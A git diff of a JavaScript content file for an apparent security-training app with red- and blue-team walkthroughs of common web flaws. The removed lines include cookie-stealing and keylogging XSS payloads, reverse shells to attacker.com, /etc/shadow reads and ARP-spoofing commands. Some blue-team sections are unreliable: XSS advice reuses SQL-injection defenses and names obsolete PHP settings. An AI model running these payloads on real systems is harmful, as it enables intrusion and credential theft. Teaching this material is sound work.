@@ -20,23 +20,36 @@ const proactiveControlsData = {
       content: `
         <h3>SQL Injection Overview</h3>
         <p>
-          SQL injection occurs when untrusted user input is concatenated into SQL queries.
-          This can lead to unauthorized data access, modification, or deletion of data.
+          SQL injection can allow attackers to read, modify, or delete database data by injecting malicious SQL into queries.
         </p>
+        <ul>
+          <li>Use parameterized queries or prepared statements</li>
+          <li>Never concatenate user input into SQL strings</li>
+          <li>Validate and sanitize all inputs</li>
+        </ul>
       `,
       redTeam: `
-        <h4>Kali Linux Testing Guide</h4>
-        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
-# Test a specific URL parameter
-sqlmap -u "http://target.com/page.php?id=1" --dbs
-
-# Test POST data
-sqlmap -u "http://target.com/form" --data="user=admin&pass=test" --dbs
-        </code></pre>
+        <h4>Red Team Walkthrough</h4>
+        <p><strong>Scenario:</strong> You are a security tester assessing a web application for SQL Injection vulnerabilities. Your goal is to determine if user input is being unsafely included in SQL queries.</p>
+        <ol>
+          <li><strong>Identify Input Points:</strong> Look for forms, URL parameters, or API endpoints that interact with the database (e.g., login, search, profile lookup).</li>
+          <li><strong>Test for Injection:</strong> Enter a single quote (<code>'</code>) or SQL meta-characters (e.g., <code>OR 1=1</code>) in input fields and observe error messages or unexpected results.</li>
+          <li><strong>Confirm Vulnerability:</strong> Try logic-altering payloads (e.g., <code>' OR 'a'='a</code>) to see if you can bypass authentication or extract data.</li>
+          <li><strong>Automate Testing:</strong> Use tools like <strong>sqlmap</strong> for deeper analysis, but always understand what the tool is doing and review its findings manually.</li>
+          <li><strong>Learning Moment:</strong> Try these steps on a safe test environment like <a href="https://owasp.org/www-project-juice-shop/" target="_blank">OWASP Juice Shop</a> or <a href="http://dvwa.co.uk/" target="_blank">DVWA</a>.</li>
+        </ol>
+        <p><em>What to try next:</em> Can you extract table names or data? What happens if you use time-based payloads?</p>
       `,
       blueTeamWindows: `
-        <h4>Blue Team Protection (Windows/.NET)</h4>
-        
+        <h4>Blue Team Walkthrough (Windows/.NET)</h4>
+        <p><strong>Scenario:</strong> You are a defender responsible for a .NET web application. Your goal is to detect, prevent, and respond to SQL Injection attempts.</p>
+        <ol>
+          <li><strong>Monitor for Anomalies:</strong> Set up logging for failed logins, unexpected query errors, and suspicious input patterns (e.g., single quotes, SQL keywords in user input).</li>
+          <li><strong>Alert on Suspicious Activity:</strong> Configure your SIEM or Windows Defender ATP to alert on repeated SQL errors or access to sensitive tables.</li>
+          <li><strong>Investigate Incidents:</strong> Review logs for error messages like "syntax error" or "unclosed quotation mark". Correlate with user activity and IP addresses.</li>
+          <li><strong>Harden the Application:</strong> Enforce parameterized queries (see code below), disable detailed error messages in production, and restrict database user privileges.</li>
+          <li><strong>Learning Moment:</strong> Try simulating SQLi in a test environment and watch your logs—can you spot the attack?</li>
+        </ol>
         <h5>1. Use Entity Framework Core</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
 # Safe query using LINQ
@@ -52,7 +65,6 @@ using (var cmd = new SqlCommand(
     // ...
 }
         </code></pre>
-
         <h5>2. IIS Web.config Settings</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
 <configuration>
@@ -63,7 +75,6 @@ using (var cmd = new SqlCommand(
    </system.web>
 </configuration>
         </code></pre>
-
         <h5>3. Windows Defender ATP Rules</h5>
         <p>Enable SQL Server audit logging and alerts for:</p>
         <ul>
@@ -73,8 +84,15 @@ using (var cmd = new SqlCommand(
         </ul>
       `,
       blueTeamMac: `
-        <h4>Blue Team Protection (Mac/PHP)</h4>
-        
+        <h4>Blue Team Walkthrough (Mac/PHP)</h4>
+        <p><strong>Scenario:</strong> You are a defender for a PHP web app running on Mac/Apache. Your goal is to detect and prevent SQL Injection.</p>
+        <ol>
+          <li><strong>Monitor Logs:</strong> Check Apache and PHP logs for SQL errors, suspicious input, and repeated failed queries.</li>
+          <li><strong>Alert on Patterns:</strong> Use log monitoring tools (e.g., <strong>OSSEC</strong>, <strong>Wazuh</strong>) to alert on SQL error patterns or repeated suspicious requests.</li>
+          <li><strong>Investigate:</strong> Correlate suspicious requests with user agents, IPs, and times. Look for automated scanning or brute force attempts.</li>
+          <li><strong>Harden:</strong> Use PDO prepared statements (see below), disable <code>magic_quotes_gpc</code>, and set <code>sql.safe_mode</code> to On. Limit DB user privileges.</li>
+          <li><strong>Learning Moment:</strong> Try running a SQLi scanner against your test app and see what shows up in your logs.</li>
+        </ol>
         <h5>1. PDO Prepared Statements</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
 <?php
@@ -82,14 +100,12 @@ $stmt = $pdo->prepare('SELECT * FROM users WHERE id = :id');
 $stmt->execute(['id' => $userId]);
 $user = $stmt->fetch();
         </code></pre>
-
         <h5>2. Apache ModSecurity Rules</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
 # In httpd.conf or .htaccess
 SecRule REQUEST_URI|REQUEST_BODY "@detectSQLi" \
     "id:981231,phase:2,block,msg:'SQL Injection Attack'"
         </code></pre>
-
         <h5>3. PHP Configuration</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
 # php.ini settings
@@ -98,8 +114,15 @@ sql.safe_mode = On
         </code></pre>
       `,
       blueTeamLinux: `
-        <h4>Blue Team Protection (Linux/Node.js)</h4>
-        
+        <h4>Blue Team Walkthrough (Linux/Node.js)</h4>
+        <p><strong>Scenario:</strong> You are a defender for a Node.js app on Linux. Your goal is to detect and prevent SQL Injection.</p>
+        <ol>
+          <li><strong>Monitor:</strong> Use <strong>fail2ban</strong>, <strong>OSSEC</strong>, or <strong>ELK Stack</strong> to monitor logs for SQL errors and suspicious requests.</li>
+          <li><strong>Alert:</strong> Set up alerts for repeated SQL errors, access to sensitive endpoints, or unusual query patterns.</li>
+          <li><strong>Investigate:</strong> Review logs for error messages, correlate with user/IP, and check for automated attacks.</li>
+          <li><strong>Harden:</strong> Use ORM/query builders (see below), enable ModSecurity on Nginx, and restrict DB user privileges.</li>
+          <li><strong>Learning Moment:</strong> Simulate SQLi in a test app and see what your monitoring tools catch.</li>
+        </ol>
         <h5>1. Use ORM/Query Builders</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
 # Sequelize ORM
@@ -112,7 +135,6 @@ const users = await knex('users')
   .where({ id: userId })
   .select();
         </code></pre>
-
         <h5>2. ModSecurity on Nginx</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
 # nginx.conf
@@ -121,7 +143,6 @@ location / {
     modsecurity_rules_file /etc/nginx/modsec/main.conf;
 }
         </code></pre>
-
         <h5>3. AppArmor Profile</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
 # /etc/apparmor.d/usr.sbin.mysqld
@@ -140,56 +161,36 @@ location / {
       content: `
         <h3>XSS Attack Overview</h3>
         <p>
-          Cross-site scripting occurs when malicious scripts are injected into trusted websites.
-          These can steal session tokens, cookies, and other sensitive information.
+          Cross-Site Scripting allows attackers to execute malicious scripts in users' browsers.
         </p>
+        <ul>
+          <li>Use content security policy (CSP)</li>
+          <li>Encode/escape all user input</li>
+          <li>Use safe JavaScript frameworks/libraries (modern frameworks like React, Vue, and Angular are safer by default, as they escape content automatically)</li>
+        </ul>
       `,
       redTeam: `
-        <h4>Kali Linux Testing Guide</h4>
-        
-        <h5>1. Basic XSS Payloads</h5>
-        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
-# Basic tests
-<code>
-scriptXMLTag alert(1) script
-</code>
-<code>
-imgXMLTag src=x onerror=alert(1)>
-</code>
-<code>
-svgXMLTag onload=alert(1)>
-</code>
-</code>
-
-# Cookie stealing
-scriptXMLTag
-fetch('http://attacker.com/steal?cookie='+document.cookie)
-</scriptXMLTag>
-
-# Keylogger
-<code>
-scriptXMLTag
-document.onkeypress = function(e) {
-  fetch('http://attacker.com/log?key='+e.key)
-}
-</code>
-        </code></pre>
-
-        <h5>2. Using XSS Tools</h5>
-        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
-# Using XSSer
-xsser --url "http://target.com/search?q=FUZZ" --auto
-
-# Using BurpSuite
-1. Enable proxy
-2. Send to Intruder
-3. Load XSS payload list
-4. Start attack
-        </code></pre>
+        <h4>Red Team Walkthrough</h4>
+        <p><strong>Scenario:</strong> You are a security tester assessing a web application for XSS vulnerabilities. Your goal is to determine if user input is being rendered in a web page without proper sanitization.</p>
+        <ol>
+          <li><strong>Identify Input Points:</strong> Look for places where user input is rendered in the web page (e.g., comments, error messages, profile fields).</li>
+          <li><strong>Test for Injection:</strong> Enter a script or HTML tag in input fields and observe if it is rendered in the output.</li>
+          <li><strong>Confirm Vulnerability:</strong> Try payloads like <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code> or <code>&lt;img src=x onerror=alert(1)&gt;</code>.</li>
+          <li><strong>Automate Testing:</strong> Use tools like <strong>Burp Suite</strong> or <strong>OWASP ZAP</strong> for automated testing.</li>
+          <li><strong>Learning Moment:</strong> Try these steps on a safe test environment like <a href="https://owasp.org/www-project-juice-shop/" target="_blank">OWASP Juice Shop</a> or <a href="http://dvwa.co.uk/" target="_blank">DVWA</a>.</li>
+        </ol>
+        <p><em>What to try next:</em> Can you execute a script in another user's browser? What happens if you use different payloads?</p>
       `,
       blueTeamWindows: `
-        <h4>Blue Team Protection (Windows/.NET)</h4>
-        
+        <h4>Blue Team Walkthrough (Windows/.NET)</h4>
+        <p><strong>Scenario:</strong> You are a defender responsible for a .NET web application. Your goal is to detect, prevent, and respond to XSS attacks.</p>
+        <ol>
+          <li><strong>Monitor for Anomalies:</strong> Set up logging for unusual request patterns, suspicious input, and unusual response times.</li>
+          <li><strong>Alert on Suspicious Activity:</strong> Configure your SIEM or Windows Defender ATP to alert on repeated XSS attempts or access to sensitive pages.</li>
+          <li><strong>Investigate Incidents:</strong> Review logs for unusual request patterns, suspicious input, and unusual response times.</li>
+          <li><strong>Harden the Application:</strong> Implement CSP headers, use safe libraries, and sanitize all user inputs.</li>
+          <li><strong>Learning Moment:</strong> Try running a XSS scanner against your test app and see what shows up in your logs.</li>
+        </ol>
         <h5>1. Use built-in XSS protection</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
 # In Startup.cs
@@ -198,15 +199,21 @@ app.Use(async (context, next) => {
     await next();
 });
         </code></pre>
-
         <h5>2. Implement CSP headers</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
 Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-random123'
         </code></pre>
       `,
       blueTeamMac: `
-        <h4>Blue Team Protection (Mac/PHP)</h4>
-        
+        <h4>Blue Team Walkthrough (Mac/PHP)</h4>
+        <p><strong>Scenario:</strong> You are a defender for a PHP web app running on Mac/Apache. Your goal is to detect and prevent XSS.</p>
+        <ol>
+          <li><strong>Monitor Logs:</strong> Check Apache and PHP logs for unusual request patterns, suspicious input, and unusual response times.</li>
+          <li><strong>Alert:</strong> Set up alerts for unusual request patterns, suspicious input, and unusual response times.</li>
+          <li><strong>Investigate:</strong> Correlate suspicious requests with user agents, IPs, and times. Look for unusual patterns or access to sensitive pages.</li>
+          <li><strong>Harden:</strong> Use safe libraries, sanitize all user inputs, and implement CSP headers.</li>
+          <li><strong>Learning Moment:</strong> Try running a XSS scanner against your test app and see what shows up in your logs.</li>
+        </ol>
         <h5>1. PDO Prepared Statements</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
 <?php
@@ -214,14 +221,12 @@ $stmt = $pdo->prepare('SELECT * FROM users WHERE id = :id');
 $stmt->execute(['id' => $userId]);
 $user = $stmt->fetch();
         </code></pre>
-
         <h5>2. Apache ModSecurity Rules</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
 # In httpd.conf or .htaccess
 SecRule REQUEST_URI|REQUEST_BODY "@detectSQLi" \
     "id:981231,phase:2,block,msg:'SQL Injection Attack'"
         </code></pre>
-
         <h5>3. PHP Configuration</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
 # php.ini settings
@@ -230,8 +235,15 @@ sql.safe_mode = On
         </code></pre>
       `,
       blueTeamLinux: `
-        <h4>Blue Team Protection (Linux/Nginx/Node.js)</h4>
-        
+        <h4>Blue Team Walkthrough (Linux/Nginx/Node.js)</h4>
+        <p><strong>Scenario:</strong> You are a defender for a Node.js app on Linux. Your goal is to detect and prevent XSS.</p>
+        <ol>
+          <li><strong>Monitor:</strong> Use <strong>fail2ban</strong>, <strong>OSSEC</strong>, or <strong>ELK Stack</strong> to monitor logs for unusual request patterns, suspicious input, and unusual response times.</li>
+          <li><strong>Alert:</strong> Set up alerts for unusual request patterns, suspicious input, and unusual response times.</li>
+          <li><strong>Investigate:</strong> Correlate suspicious requests with user agents, IPs, and times. Look for unusual patterns or access to sensitive pages.</li>
+          <li><strong>Harden:</strong> Use ORM/query builders (see below), enable ModSecurity on Nginx, and restrict access to sensitive pages.</li>
+          <li><strong>Learning Moment:</strong> Try running a XSS scanner against your test app and see what shows up in your logs.</li>
+        </ol>
         <h5>1. Use ORM/Query Builders</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
 # Sequelize ORM
@@ -244,7 +256,6 @@ const users = await knex('users')
   .where({ id: userId })
   .select();
         </code></pre>
-
         <h5>2. ModSecurity on Nginx</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
 # nginx.conf
@@ -253,7 +264,6 @@ location / {
     modsecurity_rules_file /etc/nginx/modsec/main.conf;
 }
         </code></pre>
-
         <h5>3. AppArmor Profile</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
 # /etc/apparmor.d/usr.sbin.mysqld
@@ -273,32 +283,37 @@ location / {
       content: `
         <h3>Server-side Access Control Overview</h3>
         <p>
-          Broken Access Control is often found when roles or permissions are 
-          only enforced on the client side, or misconfigured on the server.
+          Broken access control moves up from the fifth position to #1. The 34 CWEs mapped to Broken Access Control had more occurrences in applications than any other category.
         </p>
         <ul>
-          <li>Always check permissions server-side</li>
-          <li>Deny by default, allow only if explicitly granted</li>
-          <li>Avoid direct object references without checks</li>
+          <li>Enforce access control through a trusted server-side component</li>
+          <li>Deny access by default, unless explicitly allowed</li>
+          <li>Implement access control mechanisms once and re-use them throughout the application</li>
         </ul>
       `,
       redTeam: `
-        <h4 class="text-red-400">Kali Pentest Approach</h4>
-        <p>Use tools like <strong>Burp Suite</strong> or <strong>OWASP ZAP</strong> to intercept requests and manipulate roles or IDs:</p>
-        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
-# Example: Modify JSON or query string to escalate privileges
-{
-  "role": "admin"
-}
-        </code></pre>
-        <p>Check if the server enforces admin privileges or not.</p>
+        <h4>Red Team Walkthrough</h4>
+        <p><strong>Scenario:</strong> You are a security tester assessing a web application for broken access control. Your goal is to determine if users can access resources they shouldn't be able to access.</p>
+        <ol>
+          <li><strong>Identify Access Points:</strong> Look for places where access control is not enforced (e.g., admin pages, user profile sections).</li>
+          <li><strong>Test for Access:</strong> Try accessing resources with different user roles or IDs.</li>
+          <li><strong>Confirm Vulnerability:</strong> Verify if the server enforces access control.</li>
+          <li><strong>Automate Testing:</strong> Use tools like <strong>Burp Suite</strong> or <strong>OWASP ZAP</strong> for automated testing.</li>
+          <li><strong>Learning Moment:</strong> Try these steps on a safe test environment like <a href="https://owasp.org/www-project-juice-shop/" target="_blank">OWASP Juice Shop</a> or <a href="http://dvwa.co.uk/" target="_blank">DVWA</a>.</li>
+        </ol>
+        <p><em>What to try next:</em> Can you access resources with different roles? What happens if you use different IDs?</p>
       `,
       blueTeamWindows: `
-        <h4>Blue Team (Windows/IIS/.NET)</h4>
-        <p>
-          In ASP.NET, decorate controllers or actions with <code>[Authorize(Roles="Admin")]</code> 
-          to enforce role checks server-side.
-        </p>
+        <h4>Blue Team Walkthrough (Windows/.NET)</h4>
+        <p><strong>Scenario:</strong> You are a defender for a .NET web app. Your goal is to detect and prevent broken access control.</p>
+        <ol>
+          <li><strong>Monitor:</strong> Log all access to sensitive endpoints and failed access attempts. Use Windows Event Logs and your SIEM to track privilege escalation or unauthorized access.</li>
+          <li><strong>Alert:</strong> Set up alerts for repeated access denials, privilege changes, or access to admin endpoints by non-admin users.</li>
+          <li><strong>Investigate:</strong> Review logs for suspicious access patterns, correlate with user roles and IPs, and check for privilege escalation attempts.</li>
+          <li><strong>Harden:</strong> Enforce server-side access control (see code), use role-based authorization, and deny by default.</li>
+          <li><strong>Learning Moment:</strong> Simulate role tampering in a test app and see if your monitoring catches it.</li>
+        </ol>
+        <h5>1. Enforce Role Checks</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
 [Authorize(Roles = "Admin")]
 public IActionResult AdminOnly() {
@@ -307,23 +322,33 @@ public IActionResult AdminOnly() {
         </code></pre>
       `,
       blueTeamMac: `
-        <h4>Blue Team (Mac/Apache/PHP)</h4>
-        <p>
-          Use <strong>.htaccess</strong> or <strong>Apache configurations</strong> to enforce 
-          directory-level security. Deny by default:
-        </p>
+        <h4>Blue Team Walkthrough (Mac/Apache/PHP)</h4>
+        <p><strong>Scenario:</strong> You are a defender for a PHP app on Apache. Your goal is to detect and prevent broken access control.</p>
+        <ol>
+          <li><strong>Monitor:</strong> Log all access to sensitive directories and failed access attempts. Use Apache logs and tools like OSSEC.</li>
+          <li><strong>Alert:</strong> Set up alerts for repeated access denials or access to restricted directories.</li>
+          <li><strong>Investigate:</strong> Correlate logs with user agents, IPs, and times. Look for privilege escalation or direct object reference attempts.</li>
+          <li><strong>Harden:</strong> Use .htaccess to deny by default, enforce checks in PHP code, and avoid exposing direct object references.</li>
+          <li><strong>Learning Moment:</strong> Try accessing restricted directories as a non-admin and see if your monitoring catches it.</li>
+        </ol>
+        <h5>1. Directory-level Security</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
 <Directory /var/www/html/secure>
    Require all denied
 </Directory>
         </code></pre>
-        <p>And enforce checks in your PHP code as well.</p>
       `,
       blueTeamLinux: `
-        <h4>Blue Team (Linux/Nginx/Node.js)</h4>
-        <p>
-          Implement middleware for each route to enforce server-side checks:
-        </p>
+        <h4>Blue Team Walkthrough (Linux/Nginx/Node.js)</h4>
+        <p><strong>Scenario:</strong> You are a defender for a Node.js app on Linux. Your goal is to detect and prevent broken access control.</p>
+        <ol>
+          <li><strong>Monitor:</strong> Use ELK Stack or OSSEC to monitor access to sensitive endpoints and failed access attempts.</li>
+          <li><strong>Alert:</strong> Set up alerts for repeated access denials, privilege changes, or access to admin endpoints by non-admin users.</li>
+          <li><strong>Investigate:</strong> Review logs for suspicious access patterns, correlate with user roles and IPs, and check for privilege escalation attempts.</li>
+          <li><strong>Harden:</strong> Implement middleware for server-side checks, deny by default, and avoid exposing direct object references.</li>
+          <li><strong>Learning Moment:</strong> Simulate privilege escalation in a test app and see if your monitoring catches it.</li>
+        </ol>
+        <h5>1. Middleware for Access Control</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
 function requireAdmin(req, res, next) {
   if (!req.user || !req.user.isAdmin) {
@@ -344,55 +369,36 @@ app.get('/api/v1/docs/:id', requireAdmin, (req, res) => {
       content: `
         <h3>Command Injection Overview</h3>
         <p>
-          Command injection vulnerabilities occur when applications pass unsafe user input to system shells.
-          This can lead to unauthorized command execution on the host system.
+          Command injection can allow attackers to execute arbitrary system commands on the host.
         </p>
+        <ul>
+          <li>Avoid command execution if possible</li>
+          <li>Use safer alternatives like APIs or libraries</li>
+          <li>If necessary, use strict input validation and command arrays</li>
+        </ul>
       `,
       redTeam: `
-        <h4>Kali Linux Testing Guide</h4>
-        
-        <h5>1. Basic Command Injection</h5>
-        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
-# Basic payload tests
-; ls -la
-& whoami
-| cat /etc/passwd
-\`id\`
-$(cat /etc/shadow)
-
-# Command chaining
-original_cmd && malicious_cmd
-original_cmd | malicious_cmd
-        </code></pre>
-
-        <h5>2. Advanced Techniques</h5>
-        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
-# Bypass space filters
-cat\${IFS}/etc/passwd
-{cat,/etc/passwd}
-X=\$'cat\\x20/etc/passwd'&&\$X
-
-# Reverse shells
-bash -i >& /dev/tcp/attacker.com/4444 0>&1
-nc -e /bin/sh attacker.com 4444
-python -c 'import socket,subprocess;s=socket.socket();s.connect(("attacker.com",4444));subprocess.call(["/bin/sh","-i"])'
-        </code></pre>
-
-        <h5>3. Using Command Injection Tools</h5>
-        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
-# Using commix
-commix --url="http://target.com/vulnerable.php?cmd=id" --level=3
-
-# Using BurpSuite Intruder
-1. Intercept request
-2. Send to Intruder
-3. Load command injection payload list
-4. Start attack
-        </code></pre>
+        <h4>Red Team Walkthrough</h4>
+        <p><strong>Scenario:</strong> You are a security tester assessing a web application for command injection vulnerabilities. Your goal is to determine if user input is being executed as system commands.</p>
+        <ol>
+          <li><strong>Identify Input Points:</strong> Look for places where user input is used in system commands (e.g., command line arguments, environment variables).</li>
+          <li><strong>Test for Injection:</strong> Enter a command or command chaining in input fields and observe error messages or unexpected results.</li>
+          <li><strong>Confirm Vulnerability:</strong> Try logic-altering payloads (e.g., <code>; ls -la</code> or <code>& whoami</code>) to see if you can execute system commands.</li>
+          <li><strong>Automate Testing:</strong> Use tools like <strong>Burp Suite</strong> or <strong>OWASP ZAP</strong> for automated testing.</li>
+          <li><strong>Learning Moment:</strong> Try these steps on a safe test environment like <a href="https://owasp.org/www-project-juice-shop/" target="_blank">OWASP Juice Shop</a> or <a href="http://dvwa.co.uk/" target="_blank">DVWA</a>.</li>
+        </ol>
+        <p><em>What to try next:</em> Can you execute system commands? What happens if you use different payloads?</p>
       `,
       blueTeamWindows: `
-        <h4>Blue Team Protection (Windows)</h4>
-        
+        <h4>Blue Team Walkthrough (Windows/.NET)</h4>
+        <p><strong>Scenario:</strong> You are a defender for a .NET app. Your goal is to detect and prevent command injection.</p>
+        <ol>
+          <li><strong>Monitor:</strong> Log all system command executions and unexpected errors. Use Windows Event Logs and your SIEM to track suspicious command activity.</li>
+          <li><strong>Alert:</strong> Set up alerts for unusual command patterns, failed executions, or commands run by the web server user.</li>
+          <li><strong>Investigate:</strong> Review logs for unexpected command invocations, correlate with user actions and input, and check for privilege escalation attempts.</li>
+          <li><strong>Harden:</strong> Use safe APIs, restrict command execution, and implement allow-lists for commands.</li>
+          <li><strong>Learning Moment:</strong> Simulate command injection in a test app and see if your monitoring catches it.</li>
+        </ol>
         <h5>1. Use Safe APIs</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
 # Instead of Process.Start with shell
@@ -406,19 +412,24 @@ Process.Start(new ProcessStartInfo {
     RedirectStandardOutput = true
 });
         </code></pre>
-
         <h5>2. AppLocker Rules</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
 # PowerShell command to create AppLocker rule
 New-AppLockerPolicy -RuleType Path -PathCondition "C:\\Windows\\*" -User Everyone -Action Allow
         </code></pre>
-
         <h5>3. Windows Defender Application Control</h5>
         <p>Enable and configure WDAC policies to restrict executable files.</p>
       `,
       blueTeamMac: `
-        <h4>Blue Team Protection (Mac)</h4>
-        
+        <h4>Blue Team Walkthrough (Mac)</h4>
+        <p><strong>Scenario:</strong> You are a defender for a Mac app. Your goal is to detect and prevent command injection.</p>
+        <ol>
+          <li><strong>Monitor:</strong> Log all system command executions and unexpected errors. Use system logs and tools like OSQuery to track suspicious command activity.</li>
+          <li><strong>Alert:</strong> Set up alerts for unusual command patterns, failed executions, or commands run by the web server user.</li>
+          <li><strong>Investigate:</strong> Review logs for unexpected command invocations, correlate with user actions and input, and check for privilege escalation attempts.</li>
+          <li><strong>Harden:</strong> Use NSTask instead of system(), enable System Integrity Protection, and keep XProtect and Gatekeeper updated.</li>
+          <li><strong>Learning Moment:</strong> Simulate command injection in a test app and see if your monitoring catches it.</li>
+        </ol>
         <h5>1. Use NSTask Instead of system()</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
 NSTask *task = [[NSTask alloc] init];
@@ -426,7 +437,6 @@ NSTask *task = [[NSTask alloc] init];
 [task setArguments:@[@"-l"]];
 [task launch];
         </code></pre>
-
         <h5>2. System Integrity Protection</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
 # Check SIP status
@@ -435,13 +445,19 @@ csrutil status
 # Enable SIP (requires recovery mode)
 csrutil enable
         </code></pre>
-
         <h5>3. XProtect and Gatekeeper</h5>
         <p>Keep XProtect and Gatekeeper enabled and updated.</p>
       `,
       blueTeamLinux: `
-        <h4>Blue Team Protection (Linux)</h4>
-        
+        <h4>Blue Team Walkthrough (Linux)</h4>
+        <p><strong>Scenario:</strong> You are a defender for a Linux app. Your goal is to detect and prevent command injection.</p>
+        <ol>
+          <li><strong>Monitor:</strong> Use auditd, OSSEC, or ELK Stack to monitor command execution and suspicious activity.</li>
+          <li><strong>Alert:</strong> Set up alerts for unexpected command invocations, failed executions, or commands run by the web server user.</li>
+          <li><strong>Investigate:</strong> Review logs for unexpected command invocations, correlate with user actions and input, and check for privilege escalation attempts.</li>
+          <li><strong>Harden:</strong> Use safe execution methods, restrict shell access, and remove unnecessary SUID binaries.</li>
+          <li><strong>Learning Moment:</strong> Simulate command injection in a test app and see if your monitoring catches it.</li>
+        </ol>
         <h5>1. Use Safe Execution Methods</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
 # Instead of exec or system
@@ -454,7 +470,6 @@ execFile('ls', ['-l'], (error, stdout, stderr) => {
     console.log(stdout);
 });
         </code></pre>
-
         <h5>2. SELinux/AppArmor Profiles</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
 # AppArmor profile
@@ -465,7 +480,6 @@ profile web-app /usr/bin/web-app {
     deny /etc/passwd r,
 }
         </code></pre>
-
         <h5>3. System Hardening</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
 # Restrict shell access
@@ -483,40 +497,38 @@ chmod u-s /path/to/unnecessary/suid/binary
       content: `
         <h3>Sensitive Data Exposure Overview</h3>
         <p>
-          Cryptographic failures lead to exposure of sensitive data such as passwords,
-          credit card numbers, and personal information.
+          Exposing sensitive data like API keys or credentials can lead to unauthorized access and account takeover.
         </p>
+        <ul>
+          <li>Never hardcode sensitive data in source code</li>
+          <li>Use environment variables or secure vaults</li>
+          <li>Implement proper encryption for sensitive data storage</li>
+          <li>Use secrets scanning tools (e.g., GitGuardian, TruffleHog) to detect accidental leaks</li>
+          <li>Consider cloud KMS (Key Management Services) for managing secrets at scale</li>
+        </ul>
       `,
       redTeam: `
-        <h4>Kali Linux Testing Guide</h4>
-        
-        <h5>1. Network Traffic Analysis</h5>
-        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
-# Using Wireshark
-wireshark -i eth0 -f "host target.com"
-
-# Using tcpdump
-tcpdump -i eth0 -A 'host target.com and tcp port 80'
-
-# SSLstrip for HTTPS downgrade
-sslstrip -l 8080
-arpspoof -i eth0 -t target_ip gateway_ip
-        </code></pre>
-
-        <h5>2. Static Analysis</h5>
-        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
-# Search for API keys and secrets
-grep -r "api[_-]key" .
-grep -r "secret[_-]key" .
-find . -type f -exec grep -l "password" {} \;
-
-# Using trufflehog
-trufflehog --regex --entropy=True https://github.com/target/repo
-        </code></pre>
+        <h4>Red Team Walkthrough</h4>
+        <p><strong>Scenario:</strong> You are a security tester assessing a web application for sensitive data exposure. Your goal is to determine if sensitive data is being exposed in the network traffic.</p>
+        <ol>
+          <li><strong>Identify Network Traffic:</strong> Use tools like <strong>Wireshark</strong> or <strong>tcpdump</strong> to capture network traffic.</li>
+          <li><strong>Analyze Traffic:</strong> Look for patterns or data that might be sensitive (e.g., API keys, passwords, credit card numbers).</li>
+          <li><strong>Confirm Vulnerability:</strong> Verify if the data is being exposed in plaintext or if SSL/TLS is being bypassed.</li>
+          <li><strong>Automate Testing:</strong> Use tools like <strong>SSLstrip</strong> for detecting HTTPS downgrade attacks.</li>
+          <li><strong>Learning Moment:</strong> Try these steps on a safe test environment like <a href="https://owasp.org/www-project-juice-shop/" target="_blank">OWASP Juice Shop</a> or <a href="http://dvwa.co.uk/" target="_blank">DVWA</a>.</li>
+        </ol>
+        <p><em>What to try next:</em> Can you decrypt the traffic? What happens if you use different tools or techniques?</p>
       `,
       blueTeamWindows: `
-        <h4>Blue Team Protection (Windows)</h4>
-        
+        <h4>Blue Team Walkthrough (Windows)</h4>
+        <p><strong>Scenario:</strong> You are a defender for a Windows-based app. Your goal is to detect and prevent sensitive data exposure and cryptographic failures.</p>
+        <ol>
+          <li><strong>Monitor:</strong> Log all access to sensitive data, failed decryption attempts, and use of weak cryptography. Use Windows Event Logs and your SIEM to track sensitive data access.</li>
+          <li><strong>Alert:</strong> Set up alerts for access to sensitive files, use of deprecated crypto algorithms, or failed encryption/decryption events.</li>
+          <li><strong>Investigate:</strong> Review logs for unauthorized access, plaintext secrets, or use of weak crypto. Correlate with user actions and privilege levels.</li>
+          <li><strong>Harden:</strong> Use DPAPI or Azure Key Vault for secrets, enforce strong encryption, and scan for hardcoded secrets in code repos.</li>
+          <li><strong>Learning Moment:</strong> Simulate a secrets scan and see what your monitoring tools catch.</li>
+        </ol>
         <h5>1. Windows Data Protection API</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
 # Using DPAPI
@@ -529,7 +541,6 @@ byte[] encryptedData = ProtectedData.Protect(
     DataProtectionScope.CurrentUser
 );
         </code></pre>
-
